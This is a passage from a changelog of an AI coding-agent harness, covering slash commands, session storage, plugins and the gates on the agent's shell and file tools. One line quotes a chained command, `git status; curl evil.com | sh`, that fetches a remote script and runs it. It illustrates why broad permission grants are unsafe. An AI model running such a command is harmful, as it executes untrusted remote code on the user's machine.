  `AppState::plugin_status_contributions`, the same shape. `/resume` now
  carries it across too, proven end to end (not only asserted on the
  struct): a real `App`, a real plugin contributing a status, resumed via a
  real `App::submit("/resume <id>")`, still shows the contribution on the
  actually-rendered status line afterward
  (`crates/conway-cli/src/tui/app.rs::plugin_status_contribution_survives_resume`).
  **At the time this item closed, still a build-time snapshot, not a live
  view** — carrying it across `/resume` did not change that; every doc
  describing the field (`AppState::plugin_status_contributions`, `Conway::
  plugin_status_contributions`, `app/startup.rs`'s own `App::new` wiring)
  said so explicitly, and a genuinely live per-session poll was a separate,
  larger, deliberately unbuilt piece — a guard that died mid-session still
  reported whatever it held (typically nothing) at build time, resumed
  session or not. **2026-08-27 correction: that live poll is now built**
  (board item `01M0Y3A8MYKKE0GMYKZE1K0QTD`, commit `00cba5c`) —
  `Conway::poll_plugin_status_contributions` re-reads a live plugin handle
  on a bounded 1s tick in `conway-cli`'s `App::run`, so a guard dying or
  recovering mid-session now shows up on the very next poll, resumed
  session or not; see that entry below and `docs/plugins/statusline.md`.
  **A fourth link surfaced while tracing this
  one and is closed in the same change**: `apply_plugin_command_done`'s
  `ForkSession`/`Checkout` arms (`/conway.history.rewind`,
  `/conway.history.checkout`) reset `AppState` the identical way — their own
  comments already said "mirrors `Resume`'s reset exactly" — and had the
  identical gap; both now carry the snapshot across too, proven the same
  end-to-end way
  (`crates/conway-cli/src/tui/app/plugin_cmd.rs::plugin_status_contribution_survives_a_fork_session_outcome`).

- **The `/` command palette now generates itself from the same command
  table `commands.rs` parses, instead of a hand-kept second listing** —
  board item `01M0RW29F2ATVGCV0R8H0GQEYH`. The two had drifted: `/trust`
  and `/tree` were real, working commands invisible to anyone who only
  discovered commands by typing `/`. `commands::describe` is now the
  single declaration of every built-in's name/usage/description, matched
  exhaustively against the real `SlashCommand` enum with no catch-all arm
  — adding a command without describing it is a compile error, not a
  runtime gap someone has to notice. `/ask` and `/agents` are listed
  through the identical mechanism as every other built-in, not a special
  case: both are ordinary `SlashCommand` variants reached through
  `commands::parse` (closed by an earlier item, `01KZVZ5XV162XCQR96AQKCCCF7`).
  `/exit` and `/quit` were already both accepted by the parser (a single
  `"/quit" | "/exit"` match arm) — no behavior change there, just a stale
  diagnostic that couldn't see a disjunctive pattern. Plugin commands are
  unaffected: still merged in dynamically after the built-ins. See
  [`docs/interactive.md`](docs/interactive.md#slash-commands).

### Changed

- **The `conway` facade's own umbrella error type is now `FacadeError`, not
  `ConwayError`** — board item CON-3: `conway-core` already has its own,
  unrelated `ConwayError` (`conway_core::error::ConwayError`, re-exported
  from `conway`'s root as `CoreConwayError`), and the two shared the bare
  name at different crate depths, so every "ConwayError" reference had to
  specify which one. Mechanical rename only — no variant added, removed,
  or restructured; `conway::FacadeError` has exactly the shape
  `conway::ConwayError` had. `conway` is not yet published (`publish =
  false`), so no deprecated alias was kept.
- **`/context` defaults to the focused agent, and the `/agents` panel now
  shows each agent's id** — board item `01M0RWKJD04JBR5NCVKBQXYHV4`, from
  an operator's own use of the TUI: typing `/context` required an agent
  id, but the only place agents were listed (`/agents`) showed labels, not
  ids, and an agent with no `agent_def` rendered the same literal `agent`
  as every other such agent — so there was no way to discover a valid
  argument short of provoking the ambiguity error. `/context` with no
  argument now shows the FOCUSED agent's context (the same agent `/agents`
  already tags `(focused)`) instead of a usage error, and every row in the
  `/agents` panel now carries its own id, which is exactly what
  `resolve_agent` (`/context`/`/steer`/`/fork @<agent>`'s shared resolver)
  accepts — proven by a test that copies the id off a rendered row rather
  than constructing it independently. That id is the SHORTEST PREFIX that is
  unique among the agents on screen, with the familiar eight characters as
  its floor, extended only when it has to be. A flat eight would not have
  worked: a ULID's first eight characters carry timestamp bits 10..=47, so
  agents created within the same ~1024ms — anything spawned in one burst —
  share them every time, and two rows would print the same token, which is
  the opposite of what an identifier is for. `git`'s short-hash rule,
  applied to agents. The status line and lineage breadcrumb keep the plain
  eight characters, since they name one agent rather than offering a choice
  among several. See
  [`docs/interactive.md`](docs/interactive.md#the-agent-panel-agents).
- **The `/settings` plugins section now separates the switch from the
  explanation** — board item `01M0RW3CPE8SG3PZ2J8RTK9Y9N`, from an
  operator's own use of the TUI: the section's toggle row and its
  read-only "you get"/"you lose"/"costs" text used to sit as flat
  siblings in the same list, so nothing signalled which of the four rows
  actually responded to `Enter`. Each plugin is now exactly one row in
  the list — a `[x]`/`[ ]` checkbox (the same bracket marker a group's own
  `[-]`/`[+]` expand state already used, reused rather than a second
  visual language invented for this section alone; the two "display"
  booleans get the same box for consistency) plus its id, version, and
  summary — and its "you get"/"you lose"/"costs" text, the operator's own
  framing kept literally, moved into a detail panel below the list that
  tracks whichever plugin's row is currently selected. What a toggle
  DOES is unchanged: `Enter` still writes `~/.conway/settings.json`'s
  `plugins.install` array, and the footer still states the toggle applies
  on next restart, not immediately. See
  [`docs/interactive.md`](docs/interactive.md#the-plugins-section-a-switch-you-can-see-and-the-info-kept-apart).
- **BREAKING: sessions now default to a central, project-keyed location
  under `~/.conway/sessions/<project-key>/` (or
  `$CONWAY_CONFIG_DIR/sessions/<project-key>/`) instead of
  `<cwd>/.conway/sessions/`** — operator ruling (decision
  `01M0QK8J757ZH6R06WYJ0PQGEM`), the same argument already settled for
  `settings.json` (`~/.conway/settings.json` unconditionally), and the
  prerequisite for cross-session discovery: with one root holding every
  project's sessions, "which projects exist" becomes a directory listing
  instead of a filesystem crawl or a registry. The project key is your
  invocation directory's absolute path with `/` replaced by `-` (mirroring
  Claude Code's own `~/.claude/projects/<encoded-path>/` convention) —
  readable, not hashed, so `ls ~/.conway/sessions/` shows real project
  paths. `[session].root`, when set explicitly, keeps its old, direct
  meaning unchanged (it names the sessions directory itself, resolved
  against `cwd` if relative) — this only changes what an *unset* `root`
  means. **An existing project-local `.conway/sessions` is never read,
  moved, or deleted automatically** — conway resolves around it silently
  (an earlier draft of this change printed a recurring warning about it on
  every run instead; removed before release, see the entry below). See
  [`docs/sessions.md`](docs/sessions.md#where-session-data-lives-on-disk)
  for the full behavior, including the two-directories-two-stores property
  (subdirectory invocations still key separately) this preserves unchanged
  from before, and its [own subsection](docs/sessions.md#if-you-already-have-a-project-local-conwaysessions)
  on what to do with an old directory.
- **The session-relocation warning above never shipped as described: it
  is removed before release, not merely trimmed.** Operator ruling
  (decision `01M0RW05G3Y81AZW96NVKTY1RV`): a ~90-word notice repeating on
  every single run to describe a one-time, already-documented fact is a
  permanent tax pre-1.0, where "a breaking change is not a crisis" and the
  honest cost of a migration is a paragraph read once, not ceremony that
  trains an operator to read past warnings — exactly the attention the
  next real one needs. Nothing about the underlying resolution changed:
  an old `.conway/sessions` is still never read, moved, or deleted, which
  is precisely what made the warning safe to drop rather than merely
  soften. `WarningCode::LegacyProjectSessionsNotMigrated` is deleted
  outright, not just its emit site — nothing outside this crate's own
  `config::merge` module and its tests ever matched on it.

### Fixed

- **Pulling in an `/ask` now shows the merged question and answer in the
  transcript, live** — board item `01M0RWT9V7GNYRR53MTTQ2Y07K`: the merge
  itself was never the bug (`Runtime::pull_in` genuinely re-stamps the
  question `Provenance::MergedAsk` and appends both records to the
  parent's own log), but the operation emitted no event announcing it, so
  the transcript — which is entirely event-driven — silently gained
  content nobody saw on screen. Meanwhile the context builder already
  understood `MergedAsk`, so the model's next reply WAS informed by the
  merged exchange the whole time: the model could see what the operator
  could not. `pull_in` now emits the SAME `Event::UserTurn`/
  `Event::TextDelta` shapes `--resume`'s own replay already produces for
  these record kinds, on the parent's own stream, right after each record
  is durably appended — so a live subscriber (the TUI or any other
  `EventStream` consumer) sees the exchange land without a restart, ahead
  of a one-line `Event::AgentProgress` marker naming the ask it came from
  (`Provenance::MergedAsk`'s own contract: the merge origin stays
  "explicit and inspectable," not rendered indistinguishable from a
  prompt you typed yourself). Nothing about what's persisted changed —
  same content, same provenance, same position in the log; only a display
  gap closed. `Conway::promote`'s sibling "keep" fate was checked and
  already correct: it flips a flag on an already-independent, already
  fully visible session rather than merging into another one, so it had
  no analogous gap to begin with. See
  [`docs/interactive.md`](docs/interactive.md#slash-commands).
- **`/ask` now shows that it's working, can be abandoned from the
  keyboard, and no longer hangs unrecoverably when its child needs a tool
  permission decision** — three symptoms reported from use: no indicator
  while a question was in flight, quitting failing with "agent is still
  running" (`purge` refuses a non-terminal agent), and asking anything
  that needed a tool appearing to hang forever with no way out. The status
  line's `activity` field now shows `⠋ asking… Ns` for the duration (the
  same spinner/elapsed language an ordinary turn already uses, not a
  second one); `Ctrl-C` abandons an in-flight ask, and quitting with one
  in flight abandons it too instead of erroring. **The apparent hang was
  not a mode-stacking deadlock** — the permission prompt does reach the
  gate and an operator can answer it exactly as they would any other
  prompt — but `SessionHandle::cancel` alone could never unblock a child
  parked awaiting a permission decision: the agent loop only checks its
  cancellation token at specific cooperative points, and the call site
  that blocks on `broker.decide(..).await` is not one of them. Abandoning
  an ask now discards its pending prompt first (`TuiGate::check`'s own
  fail-closed `Deny` fallback on a dropped reply channel is what actually
  frees it), then cancels the child — the ask child's tools are
  unchanged and still reachable, since denying them would also silently
  break any question that genuinely needed one. See
  [`docs/interactive.md`](docs/interactive.md#slash-commands) and its
  "Ending a session" section.
- **One-shot's `--allowed-tools` now narrows what the model is TOLD it has,
  not just what it's permitted to call** — a dogfooding session found
  `conway -p '…' --allowed-tools 'read,grep'` opening with the model
  proposing `bash`, denied, then `glob`, denied, before it ever reached for
  a tool it actually had, burning two avoidable round trips (and their
  tokens) discovering a gap that gate-only enforcement never closed. A
  non-empty `--allowed-tools` now also narrows the announced tool set
  (intersected with `--agent`'s own `tools:` selector, so narrowing never
  widens); a bare `--deny-tools` entry is dropped from the announced set
  too, while an argument-scoped one (`bash(rm *)`) is left announced since
  most calls to it would still succeed. An EMPTY `--allowed-tools` (the
  existing fail-closed default) deliberately keeps announcing every tool,
  reversing this fix's own first draft after an empirical check found the
  obvious alternative unsafe: the announced set is also what the backend's
  own tool-call decoder validates responses against, so a call naming
  anything outside it is a harder, backend-level parse failure instead of a
  graceful runtime denial — collapsing the empty-allow-list case to nothing
  announced would turn every stray tool call under the default, no-flags
  invocation into a confusing routing failure. See `docs/scripting.md`'s
  "Permissions with no human present" section for the full behavior.
- **`ForkSpec::result_contract` is now honoured by `Conway::fork_from`**, not
  only by `SessionHandle::fork`'s live path. A contract set on the facade
  fork path previously reached no enforcement at all — silently, because
  `fork_child` built a `ResumeSpec` with no field to carry it. `ResumeSpec`
  now carries one and threads it into the *same* `AgentSpec::result_contract`
  enforcement `RootSpec` and `SubagentSpec` already use, rather than
  inventing a third mechanism. `--output-schema` composes with `--fork-from`
  accordingly; `--resume` still refuses it, for the different and still-real
  reason that `Conway::resume` takes only a `SessionId` and has no parameter
  to carry one.
- **`ProcessHookRunner` no longer ties reaping a hook's exit status to
  draining its stdout/stderr in the same `tokio::join!`.** `unix::drive` ran
  the stdin write, both output drains and `child.wait()` in one four-way
  join; it now joins the three pipe futures and reaps sequentially, matching
  the shape `conway-plugin-subprocess` already uses. Kept as a strictly safer
  ordering that removes an unnecessary coupling — **not** on the strength of
  a reproduced failure: an extensive controlled investigation could not
  reproduce a hang or any latency difference between the two shapes on the
  hardware available. This suite also gains its first
  `#[tokio::test(flavor = "multi_thread")]` test, closing a real coverage gap
  — every prior test ran current-thread, while `conway-cli`'s own
  `#[tokio::main]` is multi-thread.

### Added

- **`/trust permissions` now shows you the file BEFORE you trust it, not
  after.** Typing it opens a preview card — the same bottom-anchored modal
  the permission prompt and `/ask` use — showing the project permission
  file's current content, with `[y]`/`Enter` to confirm and `[n]`/`Esc` to
  cancel; nothing is trusted or installed until you confirm. This is a
  preview, not a diff: conway's trust store keeps only a digest of a prior
  trust decision, never its content, so there is nothing to compare the
  current bytes against — the card says this plainly when a previously
  trusted file changed, rather than implying a comparison it can't produce.
  One-shot (`conway -p`) is unaffected either way: it has no trust surface
  at all (no slash commands, no read of `trust.json`), so a new trust
  decision can never be made there, only one already made through the TUI
  can apply. See [`docs/permissions.md`](docs/permissions.md)'s "Trust"
  section and [`docs/plugins/trust-and-security.md`](docs/plugins/trust-and-security.md)
  for the full posture, including what remains out of reach without new
  storage.
- **A plugin browser in the `/settings` menu: turn a first-party plugin on
  or off without recompiling, and see what changes before you do.** A new
  **plugins** section lists every plugin `conway` links in, on or off,
  each with a one-line summary and, in the operator's own framing, **you
  get** / **you lose** / **costs** — what turning it on adds, what's
  different with it off, and its ongoing cost, if any. Toggling one
  (`Enter` on its row) writes `~/.conway/settings.json`'s `plugins.install`
  array directly (`$CONWAY_CONFIG_DIR/settings.json` when that's set) —
  the first config *writer* anywhere in conway, closing a gap `/settings`'
  own doc has named since it was built ("persisting a toggle means
  inventing a writer, and 'which layer' has no good answer" — now
  answered). The write is a targeted text splice, not a
  parse-mutate-reserialize round trip: it touches only the one array
  element that changed, leaving every other key, its ordering, and its
  formatting exactly as you left them, whether or not you hand-edit the
  file (proven against a fixture carrying `"//"`-keyed comments, unusual
  key ordering, and unrelated sections). The toggle applies on your next
  restart, never live — plugins install once, at startup — and the footer
  says so plainly. Every plugin gains a `Plugin::description()` (a new
  trait method with a zero-cost default, alongside `Plugin::instructions()`
  — the two are separate types, addressing two different audiences: the
  model reads an instruction fragment, the operator reads a description).
  See [`docs/interactive.md`](docs/interactive.md)'s "The plugins section"
  and [`docs/plugins/hooks.md`](docs/plugins/hooks.md) for the full
  `Plugin` trait surface.
- **A model can now compose what a session sends as context on its next
  turn: `conway.path`'s `compose_context_path` tool.** `write_head`/
  `ValidatedPath::derive_with` — the writer and the composer the context-path
  mechanism was built around — existed with no production caller anywhere
  in a running build until now; this tool is that caller. Bring specific
  records in from another session (`include`, resolved `(session, seq)`
  pairs — never a free-text description, since the operator's stated intent
  has already been interpreted by the model calling this tool), leave
  specific records of this session's own history out (`exclude`), or drop
  the whole own tail deliberately (`drop_own_tail: true`, off by default).
  Reports what was brought in and whether the change falls inside the
  cached portion of context — structure, never a token guess, matching the
  operator ruling that a token cost is the backend's admission gate to
  compute, nobody else's. A composition that would strand a tool call or
  its result is REFUSED (the orphan named, two repairs offered) and
  persists nothing, never silently patched. Fixes a real trap along the
  way: composing a selection that happens to carry none of a session's own
  records resets its "own tail" marker to the very beginning, which would
  otherwise let an earlier, deliberate exclusion silently reappear the
  moment anything else is said — this tool always composes from the
  session's current path (which already carries its own tail) and keeps
  just enough of it to prevent that reappearance even when
  `drop_own_tail: true` is used. Opt-in like every other first-party
  plugin: `{ "plugins": { "install": ["conway.path"] } }`. See
  [`docs/plugins/path.md`](docs/plugins/path.md) for the full contract,
  [`docs/plugins/hooks.md`](docs/plugins/hooks.md) point 18 for the new
  `ToolCtx::context_path` extension point this tool is the first consumer
  of, and [`docs/plugins/trust-and-security.md`](docs/plugins/trust-and-security.md)
  for its trust posture (an ordinary gated tool call; reads any session's
  records honestly, through the same masked resolution the harness already
  uses; writes only the calling session's own head, never another's).
- **A model can now find a session it did not already hold a reference
  to: `conway.discover`'s `search_sessions` tool.** `compose_context_path`
  (above) takes resolved `(session, seq)` pairs, correctly — but a model
  could only ever resolve intent into a reference it ALREADY held (its own
  session, or a completed subagent's `transcript_ref`), so "bring in what
  we worked out about the retry logic yesterday" had no way to resolve at
  all. This tool closes that: metadata-only by default (which sessions
  exist, when, labeled how — zero record content read), or, with a `text`
  argument, a bounded content scan (`max_sessions` caps how many sessions
  are ever opened and read, in either mode) that returns matching
  `(session, seq)` pairs ready to hand to `compose_context_path`'s
  `include`. Every reply states what was actually searched and what it
  cost — project/session/record counts, and whether more existed beyond
  `max_sessions` (`truncated`). Scoped to this project's own sessions by
  default (`scope: "current_project"`); `scope: "all_projects"` is an
  explicit widening across every project under the central sessions root
  (made possible by the session-relocation change above — one directory
  listing, never a filesystem crawl or a registry). Opt-in like every
  other first-party plugin, installed alongside `conway.path`:
  `{ "plugins": { "install": ["conway.discover", "conway.path"] } }`. See
  [`docs/plugins/discover.md`](docs/plugins/discover.md) for the full
  contract, [`docs/plugins/hooks.md`](docs/plugins/hooks.md) point 20 for
  the new `ToolCtx::session_discovery` extension point this tool is the
  first consumer of, and
  [`docs/plugins/trust-and-security.md`](docs/plugins/trust-and-security.md)'s
  "Finding a session" section for its trust posture (an ordinary gated tool
  call; read-only, never writes; content search is bounded and its cost is
  always reported).
- **A parent can now start a child with a CHOSEN context instead of an
  inherited one: `ForkSpec`/`SpawnSpec::context`.** Before this field,
  context was the one axis of a child agent that was purely inherited —
  `fork` always got the forker's entire transcript, `spawn` always got
  none, and there was no way to say "start this child with exactly these
  pieces." `context` takes an ordered list of already-resolved
  `(session, seq)` references and replaces the mode's ordinary default
  outright — the directive/prompt is still appended as the child's own
  head content record either way. This is the cache-free counterpart of
  `compose_context_path` (above): curation is nearly free at an agent
  BOUNDARY, where there is no prefix yet to invalidate, and shares that
  tool's own `derive_with`/`set_head` machinery rather than reimplementing
  it. Reading is unrestricted — the same masked, wide-open resolution
  `compose_context_path` already uses mid-chain — a reference to a masked,
  unresolvable, or nonexistent record fails the fork/spawn itself with a
  typed error, never silently. A brand-new child's `covers_upto` correctly
  lands on `LogSeq::ZERO` (its own log is still empty when the head is
  written), which is the harmless reading, not the silent-reversal trap a
  mid-chain reset can hit — the child has no prior head for anything to be
  reversed against. Embedder-facing only for this first slice, matching
  `cwd`/`root`'s own precedent: not yet reachable from the model-invoked
  `conway_fork`/`conway_spawn` tools, and not honored by
  `Conway::fork_from` (the separate, persisted-session, no-live-agent fork
  path). See
  [`docs/embedding.md`](docs/embedding.md#choosing-a-childs-starting-context-forkspecspawnspeccontext)
  for the full contract and a worked example.
- **A shipped `conway` binary can gain a tool without a rebuild: subprocess
  plugins.** A thin, disclosed slice of the out-of-process plugin host —
  `tool.spec/1` (manifest discovery) and `tool/1` (execution) only, one-shot
  exec (spawn fresh, one JSON request in, one JSON response out, torn down),
  which is the same shape `ProcessHookRunner` already uses for
  `[hooks].rules[].command` rather than the design's eventual persistent
  connection. Configure with `[plugins].subprocess` in `settings.json`;
  [`docs/plugins/subprocess-plugins.md`](docs/plugins/subprocess-plugins.md)
  is the protocol reference with a complete Python worked example — no Rust,
  no rebuild. Every failure mode (spawn failure, timeout, non-zero exit,
  garbage output, a call already cancelled) fails closed with a typed error,
  never a hang. **No new trust mechanism**: naming a command in
  `[plugins].subprocess[]` sits on the identical footing
  `[hooks].rules[].command` already has — no sandboxing, no digest check, the
  operator's own review of what they typed is the only control point. The
  list is empty by default, so nothing spawns unless deliberately named. A
  digest-keyed plugin trust kind remains a separate, deferred question.
- **`--output-schema <path>` gives one-shot mode a structured-output contract
  a caller can parse without prompting for JSON and hoping.** The schema
  becomes the run's `result_contract` — the same schema-checked-at-finish
  mechanism `conway_fork`/`conway_spawn` already gave a subagent, now
  reachable for the ROOT agent a `-p` invocation actually talks to.
  Enforcement is identical on every backend: conway reaches for no provider's
  native JSON mode (none is wired here), so there is no "enforces on one,
  asks nicely on another" split. The flag directs the model to the `report`
  tool, validates whatever it produces, and grants exactly one corrective
  retry before a mismatch becomes a terminal, named `ResultStatus::Rejected`
  (exit 1) — never a `Completed` status wrapping unvalidated text. The
  flag's schema wins outright over a named `--agent`'s own declared
  contract. Not supported with `--resume`/`--fork-from`, which is a usage
  error rather than a silent drop. `conway::SessionSpec::result_contract`
  and `conway::compile_output_schema` expose the same mechanism to an
  embedder, not only the CLI.

### Added

- **A plugin can now ship instruction text alongside its tools, not just
  the tools themselves.** `Plugin::instructions()` declares zero or more
  named fragments (name, text, the tool ids the text assumes); the
  fragment's text is injected as its own segment right after the base
  system prompt and before an operator's own directory-authored skills.
  Unlike text a plugin used to have to inject by mutating an assembled
  request from inside a context hook, a declared fragment is inspectable
  data: `/context <agent>` now shows a **preamble** section naming every
  fragment, its size, and which plugin it came from — so it is obvious that
  uninstalling the plugin removes the paragraph. A fragment naming a tool
  id that is not actually installed for the session is never sent to the
  model; it is withheld and reported inline instead (`⚠ names <tool> — not
  installed`), so a stale instruction can never quietly produce an agent
  that tries a tool and fails forever. Two installed plugins declaring the
  same fragment name is a build-time error, naming both plugins. **Known
  limitation: only root agents receive instruction fragments** — a forked or
  spawned child gets none, even when it holds a tool whose plugin declares
  one, matching the limitation directory-loaded skills already have for
  child agents. See
  [`docs/plugins/hooks.md`](docs/plugins/hooks.md) point 17 for the full
  mechanism, [`docs/interactive.md`](docs/interactive.md) for the `/context`
  preamble, and [`docs/plugins/trust-and-security.md`](docs/plugins/trust-and-security.md)
  for its trust posture (no new gate; no new capability beyond what a
  context hook already had).
- **`scripts/dogfood-note.sh` — one command from "using conway just now was
  awkward" to a board item**, plus [`docs/dogfooding.md`](docs/dogfooding.md)
  documenting the loop. Three modes (`friction`, `comment`, `session`), each
  with `--dry-run`. The script resolves the repository root from its own
  location on disk and refuses to run outside the conway checkout, so it
  cannot silently file against the wrong project. Items it creates are
  titled `[dogfooding] …` and records it appends carry `--scope dogfood`, so
  **whether the path is actually being walked is a checkable question rather
  than an assertion** — the point being that friction gets recorded instead
  of absorbed and forgotten.

### Changed

- **BREAKING: `conway_core::path::CostEstimate` no longer carries a token
  estimate — `shared_prefix_tokens_est` and `discarded_prefix_tokens_est` are
  removed.** Operator ruling: core reports STRUCTURE (shared prefix length,
  divergence position/kind, frozen-tier membership), which it can compute
  exactly and synchronously with no I/O; only a `Backend` can honestly count
  TOKENS, since that depends on the provider's own wire format. The removed
  fields were a second, `chars.div_ceil(4)` estimate that nothing read (the
  curator stage takes only `derivation.path`, never `derivation.cost`) —
  `Backend::admit` (`conway-core::ports::backend`) remains the one estimate
  that actually gates a request. `CostEstimate` is `Serialize`/`Deserialize`
  and not `#[non_exhaustive]`, so this is a genuine wire/semver break for
  anyone who persisted one; nothing in this workspace does. `CostEstimate`
  gains an additive `appended_nodes` field, and `DivergenceKind::None`'s doc
  is corrected — it no longer claims the derived path's expanded node list is
  identical to the base's, which a `ValidatedPath::derive_with` foreign
  append could already make false.
- **`Backend::token_fidelity` — a new provided method declaring how much a
  backend's `Admission::est_tokens` can be trusted** (`TokenCountFidelity`:
  `Exact` / `Calibrated` / `Heuristic`), paired with `Backend::admit`. The
  chars/4 default remains the default answer for a `Backend` that overrides
  neither method, but it is now a visible, named declaration rather than an
  inherited default a reader has to infer from the absence of a tokenizer
  dependency. Both shipped dialects (`conway-plugin-backends`'s
  `AnthropicBackend`/`OpenAiCompatBackend`) override `admit` with their own
  wire-body-aware estimate but declare `TokenCountFidelity::Heuristic`
  honestly — neither vendors a tokenizer nor has a measured calibration
  factor.
- **`conway routes explain` now shows how much to trust each candidate's own
  token estimate** — an operator-visible answer to `Backend::token_fidelity`
  above, closing the gap its own introduction left open (no production path
  read it; only tests did). `CapabilityIndex::from_backends` — already the
  code that reads each constructed backend's `Backend::capabilities()` at
  startup — now reads `Backend::token_fidelity()` too, once per backend id
  (a `Backend`-level declaration, not per-model like `Capabilities`, so it is
  a new, dedicated side table rather than a field added to `Capabilities`
  itself, which is constructed at ~40 call sites across the workspace and
  answers an unrelated question). `ExplainEntry` gains a `token_fidelity`
  field (`#[serde(default)]`, so a report encoded before this field existed
  still decodes); `conway routes explain`'s text output gains a `tokens:
  <exact|calibrated|heuristic|unknown>` suffix per candidate, `--json` gains
  a matching `"token_fidelity"` key. `unknown` covers the one case that
  cannot answer: `conway_core::routing::MinimalRouter`'s config-only
  fallback, which holds no `Arc<dyn Backend>` at all and reports `None`
  rather than guessing.
- **`conway.fs` enforces its own confinement root for all six of its tools —
  `read`, `write`, `edit`, `cd`, `glob`, `grep` — and does so
  open-relative**, closing a symlink-swap TOCTOU race that a check-then-open
  step above the tool could not. The harness-level pre-gate root walk is
  retired for those six. Two gaps were found and closed on the way: `edit`,
  `glob` and `grep` had **no** `conway.fs`-level confinement at all and were
  held only by that pre-gate, so retiring it naively would have unconfined
  them; and `bash`'s own `cwd` argument stays checked by the harness, because
  `bash` belongs to a different plugin with no containment mechanism to
  delegate to. `--root`, `ConwayBuilder::with_root` and a spawned child's
  `SubagentSpec::root` still confine end to end — one `--root` now covers
  both artifact writes and ordinary tool calls at every fork/spawn depth.

### Fixed

- **An `allow`/`command_prefix` (or `always`) rule naming `bash` — or any
  `ShellCommand`-rendering tool — now surfaces a registration notice** rather
  than installing silently and matching nothing forever. That is the mirror
  of the `read:*`-matched-nothing bug, and it was the gap the shell-gate
  removal disclosed but left open. A notice rather than a hard rejection,
  because rejecting would break every existing `permissions.json` carrying
  such an entry for no protective gain — the rule already authorized nothing.
- **Grammar holes the earlier citation-stripping sweep left behind, across
  ~80 files.** Removing a board-ID citation sometimes took the surrounding
  noun phrase with it: `"board item X found that class"` became `"found that
  class"`, `"(board item X, closing Y)"` became `"(, closing)"` — sentences
  left with no subject, a dangling comma, or a bare `()` where a citation had
  been. Repaired by naming the concept rather than re-adding a ULID, across
  `docs/plugins/`, `docs/`, and doc comments in every crate — including
  `scripts/check-board-citations.py`'s own module doc, where the citation
  checker had broken prose about citations.

### Documented

- **`AllowListGate`'s shell-metacharacter scan is examined and deliberately
  kept**, not removed to match the durable pattern-grant gate. Removing it
  would *widen* what a scoped `tool_name(pattern)` grant authorizes: a raw
  glob's `*` matches shell metacharacters, so `bash(git *)` would begin
  authorizing `git status; curl evil.com | sh`. The durable gate could drop
  its scan safely only because no pattern grant survives for a `ShellCommand`
  tool there at all. Reasoning recorded in `crates/conway/src/gates.rs` and
  `docs/permissions.md`, pinned by a test.

### Added

- **A resumed agent's per-agent plugin config survives the store round-trip
  instead of silently reverting to the unconfined global default.**
  `SessionMeta` gains a `plugin_config` field mirroring `root`'s precedent:
  a child's full effective narrowing is persisted onto its header, and
  `Runtime::resume_root` **re-derives** the resumed agent's config by
  re-applying `PluginConfig::narrow` against the *current* global config and
  the *currently* installed plugins' narrowing rules — never by trusting the
  persisted record verbatim, because a record trusted on resume is a route
  to a root wider than the parent imposed. A key a plugin no longer declares
  narrowable refuses the resume outright with a typed error, rather than
  dropping the narrowing (which returns wider, with no signal) or keeping a
  value nothing enforces. Wire compatibility falls out of the reused open-map
  type: an older conway carries an unfamiliar key forward untouched, and a
  newer one reads a log without the field as "no narrowing recorded".
- **One-shot composes with piped stdin instead of silently dropping it.**
  `-p "<text>"` is the directive and piped, non-terminal stdin is the data it
  operates on — the split `grep PATTERN` makes between its argv pattern and
  its stdin corpus — joined directive-first. `cat error.log | conway -p "what
  broke?"` now sends the model both; previously the piped bytes were read by
  nothing. A bare `-p` with piped stdin, and `-p "<text>"` with no pipe, are
  unchanged. Consequence, disclosed rather than discovered later: stdin is now
  probed even when `-p` carries text, so an inherited pipe that never closes
  will block — redirect from `/dev/null` if that is not what you want.

### Changed

- **The shipped default role is named `default`, not `coder`.**
  `config::merge::default_document`'s lowest-precedence layer baked in
  `default_role = "coder"` — a coding-agent opinion in a facade that serves a
  coding agent and a bare inference call equally, which is the same asymmetry
  `docs/embedding.md` already rejects one layer up for `ConwayConfig`'s
  absent `Default`. The role still exists with an empty chain, so an
  unmodified default still fails loud with a named `RoutingError::NoCandidate`
  rather than routing anywhere — now pinned by a paired positive/negative
  test. Only the name changed. An embedder relying on `discover()`'s baked-in
  defaults naming `coder` specifically is affected; a real project
  `settings.json`, env var, or CLI override is not.

### Added

- **Plugin configuration becomes per-agent state, narrowing-only down the
  fork/spawn tree, with `conway.fs`'s own root as the proving consumer.** A
  plugin declares which of its `PluginConfig` keys may vary per agent
  (`Plugin::narrowable_keys`) and supplies the comparison itself, so a
  parent's effective value is the only thing a child's requested override
  may **narrow** — never widen — and a key no plugin declared narrowable
  can never be set per-agent at all. `ToolCtx::config` is now built
  per-agent rather than shared process-wide. `conway.fs` reads its
  confinement root from this mechanism: two siblings spawned with
  different roots each read inside their own and are refused outside it,
  and a child attempting to widen its parent's root **fails the spawn
  outright** with a typed error rather than being silently clamped or
  honoured. `Plugin::narrowable_keys` defaults to empty, so every existing
  implementor keeps compiling and keeps today's global-only semantics.
- **`/checkout` and a reachable `ContextMask` — the session-history
  plugin's second and third commands.** `/conway.history.mask <seq>
  [unmask]` is `LogRecord::ContextMask`'s first real producer: an ordinary
  append-only `SessionStore` write, never a mutation of the masked record,
  so masking and unmasking are two later records overlaying the same
  target. `/conway.history.checkout <session-id>` forks a **named**,
  already-existing session at its own head and drives the child, leaving
  the original untouched and still listed — the one thing `/rewind`'s
  `ForkSession` outcome structurally cannot express, since it can only
  fork the calling session. A mask still affects only fork-prefix
  resolution, never a session's own later turns: excluding a segment from
  the current request is already what the append-only script-hook path
  does, and a second mechanism for one effect was declined.

### Security

- **A `bash` pattern grant can no longer auto-approve anything — not a
  chained command, and not even the exact command it names.** The
  shell-metacharacter scan that `Rule`'s allow path ran before comparing a
  prefix is **gone, not strengthened**: it read a call's rendered text and
  judged what it might do, which is precisely what `PHILOSOPHY.md` rules
  out — *"Judging a shell command means predicting what a shell will make
  of a string, and a filter built on pattern matching fails in both
  directions."* An earlier attempt to tighten it instead measured 68%
  false-positive against this repository's own logged `bash` commands.
  `Rule::gate_allows` now reads only the tool's static `RenderKind` and
  refuses every allow rule unconditionally for a `ShellCommand` tool, so a
  `bash:git status` entry in `permissions.json` installs but authorizes
  nothing at all. `deny` and `prompt` rules, and `allow` grants on
  `Structured` tools (`read`, `write`, `grep`, …), are unaffected. The
  `[p]` key is no longer offered for a shell command, because an offer
  that would then be refused is worse than no offer. One disclosed gap
  remains: such a rule installs with no registration warning and simply
  never matches — see `docs/permissions.md`'s Limits section.

### Added

- **A configured script can edit assembled context, append-only.**
  `request_assembled` and the new `context_overflow` event read a hook's
  `ContextDelta` — append a segment, or exclude one by id — and apply it
  through the *same* coherence guard the in-process `ContextHook` path
  already uses, so no second, unguarded path exists. Append-only is
  enforced by the type rather than documented: `ContextDelta` carries only
